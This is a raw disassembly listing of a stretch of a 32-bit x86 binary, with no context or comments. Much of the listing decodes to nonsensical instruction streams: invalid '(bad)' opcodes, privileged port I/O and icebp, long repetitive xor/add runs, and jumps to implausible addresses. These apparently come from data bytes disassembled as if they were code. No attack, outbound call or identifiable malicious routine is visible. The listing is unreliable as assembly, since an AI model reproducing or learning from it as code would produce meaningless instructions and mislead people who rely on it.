  405fa3:	popa   
  405fa4:	outs   dx,BYTE PTR ds:[esi]
  405fa5:	aad    0x64
  405fa7:	gs inc ecx
  405fa9:	xor    DWORD PTR [ecx],ecx
  405fab:	add    BYTE PTR [eax],al
  405fad:	bnd jp 0x406015
  405fb0:	popa   
  405fb1:	mov    ebp,0x9d69466b
  405fb6:	ins    BYTE PTR es:[edi],dx
  405fb7:	inc    ecx
  405fb8:	add    BYTE PTR [ebp-0x6d8d8b86],dl
  405fbe:	push   0x9314174
  405fc3:	add    BYTE PTR [eax],al
  405fc5:	jbe    0x406033
  405fc7:	je     0x406020
  405fc9:	add    BYTE PTR [eax-0x79909b99],bl
  405fcf:	jp     0x406015
  405fd1:	imul   eax,DWORD PTR [ebx+0x5e74636c],0x3141797b
  405fdb:	or     DWORD PTR [eax],eax
  405fdd:	add    BYTE PTR [esi+0x6c],dh
  405fe0:	je     0x40602f
  405fe2:	inc    esi
  405fe3:	ins    DWORD PTR es:[edi],dx
  405fe4:	jne    0x406052
  405fe6:	push   esp
  405fe7:	inc    ecx
  405fe8:	popa   
  405fe9:	outs   dx,BYTE PTR ds:[esi]
  405fea:	dec    ebp
  405feb:	gs gs push edi
  405fee:	xor    DWORD PTR [ecx],ecx
  405ff0:	add    BYTE PTR [eax],al
  405ff2:	sub    eax,0x4500400b
  405ff7:	or     eax,DWORD PTR [eax+0x0]
  405ffa:	dec    ebp
  405ffb:	or     eax,DWORD PTR [eax+0x0]
  405ffe:	or     eax,DWORD PTR gs:[eax+0x0]
  406002:	jmp    0xe540a011
  406007:	or     al,BYTE PTR [eax+0x0]
  40600a:	adc    DWORD PTR [ebx],ecx
  40600c:	inc    eax
  40600d:	add    cl,bh
  40600f:	or     al,BYTE PTR [eax+0x0]
  406012:	out    dx,al
  406013:	imul   esi,DWORD PTR [eax+edx*2-0x1d],0x65
  406018:	arpl   WORD PTR [ecx-0x33],ax
  40601b:	ins    BYTE PTR es:[edi],dx
  40601c:	jb     0x406083
  40601e:	loop   0x406099
  406020:	add    BYTE PTR [eax],al
  406022:	in     eax,0x65
  406024:	popa   
  406025:	fs std 
  406027:	pop    edi
  406028:	bound  esi,QWORD PTR [edx-0x30]
  40602b:	jp     0x4060a6
  40602d:	inc    ebp
  40602e:	add    BYTE PTR [ecx-0x35ffffb9],bh
  406034:	imul   esi,DWORD PTR [edx+0x6e],0xffffff94
  406038:	xor    esi,DWORD PTR gs:[edx]
  40603b:	push   edi
  40603c:	ins    DWORD PTR es:[edi],dx
  40603d:	ins    BYTE PTR es:[edi],dx
  40603e:	ins    BYTE PTR es:[edi],dx
  40603f:	xor    DWORD PTR [ecx],ecx
  406041:	add    BYTE PTR [eax],al
  406043:	test   BYTE PTR [eax+0x76],bh
  406046:	arpl   WORD PTR [ebx-0x6a9bd183],ax
  40604c:	add    BYTE PTR gs:[eax],al
  40604f:	mov    WORD PTR [esi+0x6d],gs
  406052:	jae    0x405fe0
  406054:	jge    0x406056
  406056:	add    BYTE PTR [eax+edi*2+0x76],bl
  40605a:	arpl   WORD PTR [ebx+0x7d],sp
  40605d:	cs fs dec ebp
  406060:	add    BYTE PTR gs:[eax],al
  406063:	inc    esp
  406064:	outs   dx,BYTE PTR ds:[esi]
  406065:	ins    DWORD PTR es:[edi],dx
  406066:	arpl   WORD PTR [ecx+0x72],ax
  406069:	add    BYTE PTR [eax],al
  40606b:	pop    edi
  40606c:	bound  esi,QWORD PTR [edx+0x74]
  40606f:	inc    esp
  406070:	push   0x6c
  406072:	inc    ecx
  406073:	inc    ebp
  406074:	outs   dx,DWORD PTR gs:[esi]
  406076:	arpl   WORD PTR [ecx],si
  406078:	or     DWORD PTR [eax],eax
  40607a:	add    bh,bh
  40607c:	popa   
  40607d:	jb     0x4060f3
  40607f:	and    al,0x6a
  406081:	ins    BYTE PTR es:[edi],dx
  406082:	inc    ecx
  406083:	add    eax,0x31636f65
  406088:	or     DWORD PTR [eax],eax
  40608a:	add    ah,bl
  40608c:	bound  ebp,QWORD PTR [ebp+0x61]
  40608f:	add    DWORD PTR [ebx+0x69],ebx
  406092:	gs add dh,bh
  406095:	inc    ebx
  406096:	inc    si
  406098:	fsub   DWORD PTR [ebp+eiz*2+0x0]
  40609c:	jmp    DWORD PTR [ecx+0x72]
  40609f:	je     0x406085
  4060a1:	imul   ebp,DWORD PTR [eax+edx*2-0x1d],0xd2657463
  4060a9:	jl     0x4060ab
  4060ab:	add    cl,bh
  4060ad:	ins    DWORD PTR es:[edi],dx
  4060ae:	popa   
  4060af:	jo     0x4060a1
  4060b1:	fs ins BYTE PTR es:[edi],dx
  4060b3:	outs   dx,DWORD PTR ds:[esi]
  4060b4:	ror    BYTE PTR [eax],cl
  4060b6:	add    BYTE PTR [eax],al
  4060b8:	call   0x3365:0x8c6e726e
  4060bf:	xor    cl,BYTE PTR [edi+0x6d]
  4060c2:	ins    BYTE PTR es:[edi],dx
  4060c3:	ins    BYTE PTR es:[edi],dx
  4060c4:	xor    DWORD PTR [ecx],ecx
  4060c6:	add    BYTE PTR [eax],al
  4060c8:	jbe    0x406138
  4060ca:	je     0x40611c
  4060cc:	and    DWORD PTR [ebx+eiz*2+0x65],0xffffff82
  4060d1:	js     0x40611b
  4060d3:	gs nop
  4060d5:	jns    0x4060d7
  4060d7:	add    BYTE PTR [ecx],dh
  4060d9:	or     DWORD PTR [esi+0x1],esp
  4060dc:	xor    DWORD PTR [ebp-0x20ce6fa7],ebp
  4060e2:	add    eax,DWORD PTR [eax]
  4060e4:	xor    esi,esp
  4060e6:	add    eax,DWORD PTR [eax]
  4060e8:	xor    ebx,esi
  4060ea:	sti    
  4060eb:	add    BYTE PTR [ecx],dh
  4060ed:	cmp    al,BYTE PTR [ebx]
  4060ef:	add    BYTE PTR [ecx],dh
  4060f1:	loop   0x4060f6
  4060f3:	add    BYTE PTR [ecx],dh
  4060f5:	and    al,BYTE PTR [eax+eax*1]
  4060f8:	add    BYTE PTR [ecx],dh
  4060fa:	loop   0x4060ff
  4060fc:	add    BYTE PTR [ecx],dh
  4060fe:	loop   0x406103
  406100:	add    BYTE PTR [ecx],dh
  406102:	loop   0x406107
  406104:	add    BYTE PTR [ecx],dh
  406106:	loop   0x40610b
  406108:	add    BYTE PTR [ecx],dh
  40610a:	loop   0x40610f
  40610c:	add    BYTE PTR [ecx],dh
  40610e:	loop   0x406113
  406110:	add    BYTE PTR [ecx],dh
  406112:	loop   0x406117
  406114:	add    BYTE PTR [ecx],dh
  406116:	loop   0x40611b
  406118:	add    BYTE PTR [ecx],dh
  40611a:	bound  eax,QWORD PTR [eax+eax*1]
  40611d:	xor    esp,ebp
  40611f:	sbb    bh,BYTE PTR [edx+0x9afe22f]
  406125:	sar    BYTE PTR fs:[ebx+0x25a4fd01],0x54
  40612d:	(bad)  [eax]
  40612f:	ja     0x406151
  406131:	shr    edi,0x6a
  406134:	addr16 ret 
  406136:	shr    BYTE PTR [eax+0x20],0x92
  40613a:	shr    DWORD PTR [ecx+0x6e],0x96
  40613e:	aam    0x23
  406140:	bound  edx,QWORD PTR [eax+eax*1+0x877576]
  406147:	ins    DWORD PTR es:[edi],dx
  406148:	outs   dx,BYTE PTR ds:[esi]
  406149:	push   ecx
  40614a:	lods   al,BYTE PTR ds:[esi]
  40614b:	dec    edx
  40614c:	push   ebx
  40614d:	push   ecx
  40614e:	int    0x6a
  406150:	fs xchg esp,eax
  406152:	repnz or BYTE PTR ds:0x3cd092b,cl
  406159:	xor    DWORD PTR [ecx],ecx
  40615b:	jmp    0x9716163
  406160:	mov    ecx,0x9d093140
  406165:	add    al,0x32
  406167:	or     DWORD PTR [esi+0x13],edi
  40616a:	cmp    BYTE PTR [ecx-0x17],bl
  40616d:	add    esi,DWORD PTR [ecx]
  40616f:	or     ecx,ebp
  406171:	add    esi,DWORD PTR [ecx]
  406173:	or     DWORD PTR [ecx],ecx
  406175:	add    al,0x26
  406177:	or     dl,dh
  406179:	add    al,0x33
  40617b:	aaa    
  40617c:	jmp    0xe949919c
  406181:	push   ebp
  406182:	xor    DWORD PTR [ecx],ecx
  406184:	jmp    0x1049928c
  406189:	pop    es
  40618a:	xor    BYTE PTR [ecx],cl
  40618c:	jmp    0xe94992a4
  406191:	xor    esi,DWORD PTR [eax]
  406193:	or     ecx,ebp
  406195:	add    esi,ecx
  406197:	or     cl,ch
  406199:	adc    esi,DWORD PTR [ecx]
  40619b:	or     ecx,ebp
  40619d:	add    eax,0x3ed0931
  4061a2:	xor    DWORD PTR [ecx],ecx
  4061a4:	jmp    0xed4992ac
  4061a9:	add    esi,DWORD PTR [ecx]
  4061ab:	or     ecx,ebp
  4061ad:	add    esi,DWORD PTR [ecx]
  4061af:	or     ecx,ebp
  4061b1:	xchg   ebx,eax
  4061b2:	xor    BYTE PTR [ecx],cl
  4061b4:	jmp    0xcc4992be
  4061b9:	test   eax,0x3eb0930
  4061be:	xor    DWORD PTR [ecx],ecx
  4061c0:	jmp    0x98161c8
  4061c5:	jmp    0xe94992dd
  4061ca:	add    esp,DWORD PTR [ecx]
  4061cc:	or     ecx,ebp
  4061ce:	adc    esi,DWORD PTR [ecx]
  4061d0:	or     DWORD PTR [eax],eax
  4061d2:	jmp    0xd9406b09
  4061d7:	xor    cl,BYTE PTR [ecx]
  4061d9:	add    cl,ch
  4061db:	xor    cl,BYTE PTR [ecx]
  4061dd:	add    cl,ch
  4061df:	xor    cl,BYTE PTR [ecx]
  4061e1:	add    BYTE PTR [ecx],dh
  4061e3:	pop    eax
  4061e4:	or     BYTE PTR [eax],al
  4061e6:	and    DWORD PTR [edx],esi
  4061e8:	or     DWORD PTR [eax],eax
  4061ea:	jmp    0xe9406b21
  4061ef:	xor    cl,BYTE PTR [ecx]
  4061f1:	add    cl,ch
  4061f3:	xor    cl,BYTE PTR [ecx]
  4061f5:	add    cl,ch
  4061f7:	xor    cl,BYTE PTR [ecx]
  4061f9:	add    cl,ch
  4061fb:	xor    cl,BYTE PTR [ecx]
  4061fd:	add    cl,ch
  4061ff:	xor    cl,BYTE PTR [ecx]
  406201:	add    cl,ch
  406203:	xor    cl,BYTE PTR [ecx]
  406205:	add    cl,ch
  406207:	xor    cl,BYTE PTR [ecx]
  406209:	add    cl,ch
  40620b:	xor    cl,BYTE PTR [ecx]
  40620d:	add    cl,ch
  40620f:	xor    cl,BYTE PTR [ecx]
  406211:	add    cl,ch
  406213:	xor    cl,BYTE PTR [ecx]
  406215:	add    cl,ch
  406217:	xor    cl,BYTE PTR [ecx]
  406219:	add    cl,ch
  40621b:	xor    cl,BYTE PTR [ecx]
  40621d:	add    cl,ch
  40621f:	xor    cl,BYTE PTR [ecx]
  406221:	add    cl,ch
  406223:	xor    cl,BYTE PTR [ecx]
  406225:	add    cl,ch
  406227:	add    BYTE PTR [edx],dh
  406229:	or     DWORD PTR [eax],eax
  40622b:	jmp    0xe9406b62
  406230:	xor    cl,BYTE PTR [ecx]
  406232:	add    cl,ch
  406234:	xor    cl,BYTE PTR [ecx]
  406236:	add    cl,ch
  406238:	xor    cl,BYTE PTR [ecx]
  40623a:	add    BYTE PTR [ecx],bl
  40623c:	mov    dl,0xa
  40623e:	add    BYTE PTR [ecx+0x32],bh
  406241:	or     DWORD PTR [eax],eax
  406243:	jmp    0xe9406b7a
  406248:	xor    cl,BYTE PTR [ecx]
  40624a:	add    BYTE PTR [eax],al
  40624c:	sbb    BYTE PTR ds:0xd180000,cl
  406252:	add    BYTE PTR [eax],al
  406254:	or     BYTE PTR ds:0xd080000,cl
  40625a:	add    BYTE PTR [eax],al
  40625c:	push   es
  40625d:	popa   
  40625e:	gs js  0x40621d
  406261:	or     al,0x0
  406263:	add    BYTE PTR [ebx-0x37fffee7],dl
  406269:	sbb    al,0x0
  40626b:	add    al,bl
  40626d:	adc    al,0x1
  40626f:	add    al,bl
  406271:	push   es
  406272:	add    BYTE PTR [eax],al
  406274:	enter  0xc,0x0
  406278:	enter  0xc,0x0
  40627c:	cwde   
  40627d:	or     al,0x0
  40627f:	add    BYTE PTR [eax],bh
  406281:	add    eax,0x77366000
  406286:	fs popa 
  406288:	cld    
  406289:	imul   eax,DWORD PTR [eax],0x0
  40628c:	add    BYTE PTR [eax-0x67fffff5],bl
  406292:	cmp    al,0x1
  406294:	add    BYTE PTR [eax-0x77fffffa],cl
  40629a:	push   cs
  40629b:	add    DWORD PTR [eax],eax
  40629d:	pop    eax
  40629e:	or     al,0x0
  4062a0:	add    BYTE PTR [eax+0xc],bl
  4062a3:	add    BYTE PTR [eax],al
  4062a5:	dec    eax
  4062a6:	or     al,0x0
  4062a8:	add    BYTE PTR [eax],cl
  4062aa:	add    eax,0x50664000
  4062af:	popa   
  4062b0:	je     0x4062eb
  4062b2:	add    eax,0x41d00000
  4062b7:	add    BYTE PTR [eax],al
  4062b9:	dec    eax
  4062ba:	dec    esp
  4062bb:	add    DWORD PTR [eax],eax
  4062bd:	sbb    BYTE PTR [esi],bh
  4062bf:	add    BYTE PTR [eax],al
  4062c1:	sbb    BYTE PTR [eax],bl
  4062c3:	add    DWORD PTR [eax],eax
  4062c5:	xor    edx,esp
  4062c7:	add    eax,DWORD PTR [eax]
  4062c9:	xor    edx,esp
  4062cb:	add    eax,DWORD PTR [eax]
  4062cd:	xor    edx,esp
  4062cf:	add    eax,DWORD PTR [eax]
  4062d1:	xor    DWORD PTR [edx-0x1e0efffd],esp
  4062d7:	add    eax,DWORD PTR [eax]
  4062d9:	xor    edx,esp
  4062db:	add    eax,DWORD PTR [eax]
  4062dd:	xor    edx,esp
  4062df:	add    eax,DWORD PTR [eax]
  4062e1:	xor    edx,esp
  4062e3:	add    eax,DWORD PTR [eax]
  4062e5:	xor    DWORD PTR [ebp-0x457e1374],ebp
  4062eb:	imul   ecx,DWORD PTR [edi],0x21
  4062ee:	mov    ds:0x4300f803,al
  4062f3:	loope  0x4062b9
  4062f5:	(bad)  
  4062f6:	mov    esi,0x306a0b6c
  4062fb:	mov    WORD PTR [ebx],es
  4062fd:	call   0x45312c
  406302:	js     0x4062a7
  406304:	add    BYTE PTR [eax],al
  406306:	add    al,0x6b
  406308:	call   0x268a5c5d
  40630d:	adc    cl,dh
  40630f:	loope  0x40630c
  406311:	jb     0x406343
  406313:	mov    ds:0xe9fc83f7,eax
  406318:	add    esi,DWORD PTR [edx+ebp*1+0x6b]
  40631c:	push   ecx
  40631d:	or     BYTE PTR [edx+0x3975f6f3],bh
  406323:	(bad)  
  406324:	push   edx
  406325:	or     BYTE PTR [eax-0x5d],ch
  406328:	add    BYTE PTR [eax],al
  40632a:	cld    
  40632b:	push   0xffffffe8
  40632d:	xor    DWORD PTR [ebp-0x77],0x54
  406331:	pop    eax
  406332:	fst    DWORD PTR [esp+edx*1]
  406335:	inc    eax
  406336:	xor    DWORD PTR [edx+0x72],edi
  406339:	add    DWORD PTR [edx+0x5e],esi
  40633c:	div    DWORD PTR [ebp+0x3d]
  40633f:	or     DWORD PTR [esi+0x41],esi
  406342:	sub    edi,eax
  406344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406345:	div    DWORD PTR [ecx]
  406347:	or     ecx,ebp
  406349:	add    ebp,DWORD PTR [edx+0x238ae154]
  40634f:	arpl   cx,bp
  406351:	idiv   BYTE PTR [ecx+ebx*1+0x3e]
  406355:	jno    0x406357
  406357:	std    
  406358:	out    dx,al
  406359:	mov    esp,0xe174f6fb
  40635e:	test   BYTE PTR [ebx+0x35c23015],0x9
  406365:	mov    ah,0x8a
  406367:	int    0x8a
  406369:	sub    eax,0x815181fc
  40636e:	test   DWORD PTR [ecx],esp
  406370:	dec    ecx
  406371:	jmp    0x2a48a771
  406376:	div    esi
  406378:	inc    esp
  406379:	icebp  
  40637a:	add    esi,DWORD PTR [ecx]
  40637c:	or     ecx,ebp
  40637e:	mov    esi,0x3e9ecf4
  406383:	xor    DWORD PTR [ecx],ecx
  406385:	jb     0x4063d7
  406387:	sub    DWORD PTR [edx-0xf137705],eax
  40638d:	cmp    DWORD PTR [edx+0x33],ebp
  406390:	out    dx,al
  406391:	cmp    al,0xf8
  406393:	xchg   BYTE PTR [ecx+eax*8-0xa],dh
  406397:	add    al,0x1
  406399:	mov    dh,0x51
  40639b:	sbb    eax,0x78fc2482
  4063a0:	retf   
  4063a1:	in     eax,dx
  4063a2:	add    edi,esp
  4063a4:	or     DWORD PTR [ebp+0x39f17582],0xf9bcc95c
  4063ae:	inc    ebx
  4063af:	xor    ecx,esi
  4063b1:	sti    
  4063b2:	add    al,0x72
  4063b4:	out    dx,al
  4063b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063b6:	inc    eax
  4063b7:	cmp    DWORD PTR [ecx],ecx
  4063b9:	add    cl,ch
  4063bb:	add    BYTE PTR [edx],dh
  4063bd:	or     edi,eax
  4063bf:	and    al,0x29
  4063c1:	or     DWORD PTR [eax],eax
  4063c3:	jmp    0xf195e5fa
  4063c8:	stos   DWORD PTR es:[edi],eax
  4063c9:	sbb    cl,BYTE PTR [ebp+0x6a591aac]
  4063cf:	call   0x473cd7db
  4063d4:	xor    ecx,0xee2ab4ff
  4063da:	push   edx
  4063db:	(bad)  
  4063dd:	jae    0x4063e7
  4063df:	inc    ecx
  4063e0:	mov    bl,0xed
  4063e2:	jmp    DWORD PTR [esi]
  4063e4:	add    BYTE PTR [edx+0x1aabf155],0x6a
  4063eb:	jmp    0x953f6d38
  4063f0:	(bad)  
  4063f1:	in     eax,dx
  4063f2:	jne    0x4063f5
  4063f4:	mov    edi,0x61fe0873
  4063f9:	adc    eax,0xf1616258
  4063fe:	add    edx,DWORD PTR [esi+esi*1-0x58a02fce]
  406405:	and    al,al
  406407:	mov    al,0x73
  406409:	add    BYTE PTR [eax],al
  40640b:	xchg   ecx,eax
  40640c:	xor    cl,BYTE PTR [ecx]
  40640e:	add    cl,ch
  406410:	jnp    0x4063dc
  406412:	or     cl,ch
  406414:	test   DWORD PTR [ecx-0x138e9514],0x32051150
  40641e:	adc    DWORD PTR [ecx],ebp
  406420:	add    BYTE PTR ds:0x71e872f1,dh
  406426:	in     eax,dx
  406427:	call   DWORD PTR [eax*2+0x4ae175ee]
  40642e:	je     0x40642f
  406430:	mov    es,WORD PTR [ecx+eax*1-0x40]
  406434:	add    BYTE PTR [ebp-0x13],al
  406437:	enter  0x4cc2,0x9
  40643b:	mov    edx,DWORD PTR [ebp+0x50]
  40643e:	adc    BYTE PTR [edx],0x8d
  406441:	push   ebp
  406442:	icebp  
  406443:	push   eax
  406444:	inc    DWORD PTR ds:0xc75ff19
  40644a:	div    BYTE PTR [ebp+0x8]
  40644d:	jg     0x4064a6
  40644f:	or     al,0x85
  406451:	pop    eax
  406452:	ins    DWORD PTR es:[edi],dx
  406453:	adc    ecx,DWORD PTR [ebx+0x453bf4d5]
  406459:	fcomp  DWORD PTR [ebx+0x7]
  40645c:	mov    eax,0x909
  406461:	jae    0x40644e
  406463:	sub    al,al
  406465:	inc    ebx
  406466:	pop    es
  406467:	sub    eax,eax
  406469:	and    edi,eax
  40646b:	or     al,0x0
  40646d:	xchg   ebp,eax
  40646e:	sub    esp,0x56f11483
  406474:	push   eax
  406475:	nop
  406476:	pusha  
  406477:	xchg   ebx,eax
  406478:	adc    DWORD PTR [eax-0x368d07f8],ecx
  40647e:	leave  
  40647f:	inc    DWORD PTR [ebx+0x7400041d]
  406485:	add    BYTE PTR [esi-0x77f78277],dl
  40648b:	pop    ebx
  40648c:	pop    es
  40648d:	sub    ecx,eax
  40648f:	push   esi
  406490:	leave  
  406491:	ret    0x86c
  406494:	cmp    DWORD PTR [ebp+0x68],0x8
  406498:	jne    0x4064a4
  40649a:	mov    al,0x7
  40649c:	add    BYTE PTR [eax],al
  40649e:	mov    BYTE PTR [esi-0x37],dl
  4064a1:	ret    0x88c
  4064a4:	mov    esi,DWORD PTR [ebp+0x5c]
  4064a7:	lods   eax,DWORD PTR ds:[esi]
  4064a8:	inc    ebp
  4064a9:	cld    
  4064aa:	dec    eax
  4064ab:	or     BYTE PTR [eax],al
  4064ad:	add    BYTE PTR [ecx],dh
  4064af:	addr16 dec esi
  4064b1:	or     BYTE PTR [edx+0x454586f0],bh
  4064b7:	adc    dh,ch
  4064b9:	jne    0x4064dc
  4064bb:	adc    al,0xf5
  4064bd:	jne    0x4064e8
  4064bf:	jae    0x406512
  4064c1:	adc    BYTE PTR [ecx+eiz*4+0x225a077a],dh
  4064c8:	push   ebp
  4064c9:	leave  
  4064ca:	repz fld QWORD PTR [ebx]
  4064cd:	adc    DWORD PTR [esi+edx*2+0x7367503],0xffffffc4
  4064d5:	pop    esi
  4064d6:	clc    
  4064d7:	pop    ds
  4064d8:	pop    es
  4064d9:	add    BYTE PTR [edx+0x103f7a4],ch
  4064df:	or     DWORD PTR [edi],edi
  4064e1:	adc    BYTE PTR [esi+eiz*1-0x45],ah
  4064e5:	add    DWORD PTR [ecx],esi
  4064e7:	loop   0x4064ec
  4064e9:	pop    esi
  4064ea:	add    al,ch
  4064ec:	pop    ds
  4064ed:	pop    es
  4064ee:	add    BYTE PTR [edi+eiz*2-0x19],bh
  4064f2:	xor    ebp,0xc6ffe419
  4064f8:	xchg   ecx,eax
  4064f9:	pop    ebx
  4064fa:	push   0x43d025
  4064ff:	mov    ecx,0xaec3026f
  406504:	xchg   DWORD PTR [ebx],eax
  406506:	push   0x31
  406508:	pop    eax
  406509:	pop    es
  40650a:	push   0x31
  40650c:	pop    eax
  40650d:	pop    es
  40650e:	push   0x8003e231
  406513:	mov    ss,WORD PTR [esp+edi*8-0x19]
  406517:	inc    edx
  406518:	mov    cl,0x4
  40651a:	add    BYTE PTR [eax-0x3bf0fdc],ch
  406520:	fnstsw WORD PTR [edx+eax*8+0x5de239]
  406527:	mov    ah,0x8
  406529:	sub    al,0xec
  40652b:	add    DWORD PTR [ecx-0x17],esp
  40652e:	adc    esi,DWORD PTR [ecx]
  406530:	or     DWORD PTR [ecx+ecx*4+0x49],esp
  406534:	fisttp DWORD PTR [esi-0x3141e0d]
  40653a:	out    dx,eax
  40653b:	dec    ecx
  40653c:	adc    eax,0x310478
  406541:	test   eax,0xf4ea3f79
  406546:	out    dx,eax
  406547:	sbb    ebx,edi
  406549:	push   edi
  40654a:	add    al,0x31
  40654c:	push   ds
  40654d:	sub    DWORD PTR [ebp-0x16fe0d00],edi
  406553:	repnz test cl,dh
  406556:	pop    esp
  406557:	mov    DWORD PTR [ecx],ecx
  406559:	fild   DWORD PTR [esi-0xd]
  40655c:	popa   
  40655d:	jmp    0xf335:0xfd0effb4
  406564:	out    dx,al
  406565:	xchg   BYTE PTR [ebx+ebp*8-0xc9a8bcf],ch
  40656c:	fs in  eax,dx
  40656e:	adc    ebp,ebx
  406570:	loope  0x40657b
  406572:	jmp    0xe9499622
  406577:	add    edi,eax
  406579:	(bad)  
  40657a:	icebp  
  40657b:	add    esp,DWORD PTR [esi+edi*2+0xd]
  40657f:	push   esp
  406580:	pop    ecx
  406581:	popa   
  406582:	push   eax
  406583:	push   ss
  406584:	icebp  
  406585:	or     cl,dh
  406587:	jne    0x4065b9
  406589:	(bad)  
  40658a:	out    0x5d,al
  40658c:	xor    ebx,DWORD PTR [edi-0x17]
  40658f:	repnz sbb al,0x1
  406592:	rcl    DWORD PTR [ecx-0x43311574],0x73
  406599:	add    eax,0xddaa58e9
  40659e:	sbb    DWORD PTR [ecx+ecx*1-0x4f],ecx
  4065a2:	add    bl,bl
  4065a4:	repnz or al,bh
  4065a7:	cmp    ebp,DWORD PTR [esi+eax*8]
  4065aa:	call   DWORD PTR [ebx]
  4065ac:	xor    eax,0xd99e005f
  4065b1:	add    al,ch
  4065b3:	push   ss
  4065b4:	add    BYTE PTR [eax-0x16],al
  4065b7:	jmp    DWORD PTR [eax+0x1c00056c]
  4065bd:	mov    esi,0x4aa583dc
  4065c2:	pop    ecx
  4065c3:	pop    eax
  4065c4:	add    edi,edi
  4065c6:	push   ss
  4065c7:	inc    eax
  4065c8:	jmp    0x2a41dce7
  4065cd:	and    ebp,edx
  4065cf:	jne    0x4065be
  4065d1:	mov    bl,0x43
  4065d3:	clc    
  4065d4:	cs jns 0x4065c4
  4065d7:	add    cl,ch
  4065d9:	xor    cl,BYTE PTR [ecx]
  4065db:	push   0xffffffe9
  4065dd:	add    esi,DWORD PTR [esp+ecx*1+0x3e]
  4065e1:	jns    0x4065e4
  4065e3:	call   0x2a478e
  4065e8:	bound  ecx,QWORD PTR [ecx-0x1c0474ff]
  4065ee:	jae    0x4065ec
  4065f0:	push   ds
  4065f1:	pop    ecx
  4065f2:	icebp  
  4065f3:	call   FWORD PTR [edx+ecx*8-0x7a0ead16]
  4065fa:	(bad)  
  4065fb:	or     cl,ch
  4065fd:	pop    ecx
  4065fe:	jle    0x4065ec
  406600:	cdq    
  406601:	push   0x61
  406603:	sbb    dl,bl
  406605:	repnz or al,bh
  406608:	jnp    0x406637
  40660a:	(bad)  
  40660b:	call   DWORD PTR [ebx+0x35]
  40660e:	jmp    0xd6ff:0xa27af175
  406615:	cmp    BYTE PTR [edi+0x3200e5c2],0x54
  40661c:	mov    eax,DWORD PTR [eax]
  40661e:	imul   edx,DWORD PTR fs:[ebp+0x14],0xb
  406623:	sbb    eax,DWORD PTR [eax]
  406625:	jne    0x406683
  406627:	scas   al,BYTE PTR es:[edi]
  406628:	ret    0x5810
  40662b:	clc    
  40662c:	jne    0x40663e
  40662e:	xchg   edi,eax
  40662f:	jno    0x40663d
  406631:	(bad)  
  406632:	cmp    eax,0xa5e6e7ed
  406637:	idiv   edi
  406639:	mov    edi,ebp
  40663b:	adc    BYTE PTR [ecx],ah
  40663d:	add    al,BYTE PTR [ecx+0x1d0010c2]
  406643:	ins    BYTE PTR es:[edi],dx
  406644:	in     al,dx
  406645:	sbb    esp,0xffffffd9
  406648:	push   DWORD PTR [ebp+0x4]
  40664b:	inc    edi
  40664c:	add    al,0x8d
  40664e:	int    0xf8
  406650:	push   eax
  406651:	(bad)  
  406652:	std    
  406653:	in     al,0xe7
  406655:	ret    
  406656:	addr16 (bad) 
  406659:	mov    ecx,ebp
  40665b:	call   0x61489ee2
  406660:	pop    es
  406661:	mov    ecx,ebp
  406663:	clc    
  406664:	bswap  eax
  406666:	jae    0x406677
  406668:	sub    eax,eax
  40666a:	adc    edi,ecx
  40666c:	or     BYTE PTR [eax],al
  40666e:	popf   
  40666f:	gs in  al,dx
  406671:	or     DWORD PTR [ecx+ebx*8],0xffffffff
  406675:	jne    0x40664b
  406677:	inc    esi
  406678:	add    cl,BYTE PTR [ebp-0xaf2573]
  40667e:	add    BYTE PTR ds:0xb797e7e4,bh
  406684:	fcos   
  406686:	mov    ebx,ebp
  406688:	call   0x60d89f0f
  40668d:	or     BYTE PTR [edi],cl
  40668f:	mov    edi,0xcc86fe4f
  406694:	lds    eax,FWORD PTR [edx]
  406696:	sub    esi,DWORD PTR [ecx]
  406698:	mov    dl,0xba
  40669a:	ret    0xf239
  40669d:	push   esi
  40669e:	mov    ecx,DWORD PTR [ebp+0x76fcc773]
  4066a4:	sbb    eax,0x6d306a00
  4066a9:	inc    esi
  4066aa:	inc    DWORD PTR [ecx]
  4066ac:	mov    bh,0x76
  4066ae:	or     BYTE PTR [ecx-0x4],cl
  4066b1:	lock call DWORD PTR [esi+0x5b]
  4066b5:	inc    esi
  4066b6:	or     al,0xb2
  4066b8:	mov    edx,0xc72f7403
  4066bd:	mov    ecx,0x57b3e45
  4066c2:	sub    esi,DWORD PTR [ecx-0x67]
  4066c5:	lds    ecx,FWORD PTR [eax]
  4066c7:	xor    DWORD PTR ds:0xfcbaec7d,eax
  4066cd:	adc    eax,DWORD PTR [ebx+0x476f25b]
  4066d3:	call   0x1040660b
  4066d8:	(bad)  
  4066db:	jl     0x4066c7
  4066dd:	fcmovnbe st,st(0)
  4066df:	std    
  4066e0:	dec    esi
  4066e1:	lock or eax,DWORD PTR [eax]
  4066e4:	icebp  
  4066e5:	pushf  
  4066e6:	cld    
  4066e7:	mov    al,BYTE PTR [edx+eax*8-0xdcefd38]
  4066ee:	add    eax,DWORD PTR [eax]
  4066f0:	retf   0x5ddc
  4066f3:	add    esi,edx
  4066f5:	jl     0x4066f6
  4066f7:	inc    BYTE PTR [edx+ebp*8-0x25]
  4066fb:	cmp    eax,0xc9f016c5
  406700:	repz fld QWORD PTR [ebx]
  406703:	push   ebp
  406704:	stos   BYTE PTR es:[edi],al
  406705:	adc    eax,0x87adc484
  40670a:	jl     0x406781
  40670c:	xor    eax,0xf48d038c
  406711:	or     ch,ah
  406713:	push   esp
  406714:	xchg   esi,eax
  406715:	pop    ebp
  406716:	stc    
  406717:	push   ebp
  406718:	mov    ds,WORD PTR [ebp-0x1f]
  40671b:	(bad)  
  40671d:	imul   ecx
  40671f:	add    ebp,DWORD PTR [edx]
  406721:	leave  
  406722:	cmp    eax,0xbd65b206
  406727:	add    al,0xe4
  406729:	lar    eax,sp
  40672c:	pop    es
  40672d:	shr    BYTE PTR [ebx+0x2c943100],cl
  406733:	lock xor bl,cl
  406736:	ror    BYTE PTR [eax+0x21],1
  406739:	pop    esi
  40673a:	mov    edx,0xe90930ac
  40673f:	add    ebx,edi
  406741:	shr    DWORD PTR [ebx+0x723e3100],1
  406747:	loopne 0x406749
  406749:	mov    al,0xcd
  40674b:	icebp  
  40674c:	out    dx,al
  40674d:	es out 0x1a,eax
  406750:	sbb    edi,edx
  406752:	jae    0x40673d
  406754:	pop    ecx
  406755:	xor    DWORD PTR [ebx-0x15],esi
  406758:	pop    ecx
  406759:	xor    DWORD PTR [ebx-0x16],esi
  40675c:	pop    ebx
  40675d:	xor    DWORD PTR [ecx],ecx
  40675f:	jmp    0xf59d6627
  406764:	fild   DWORD PTR [ecx]
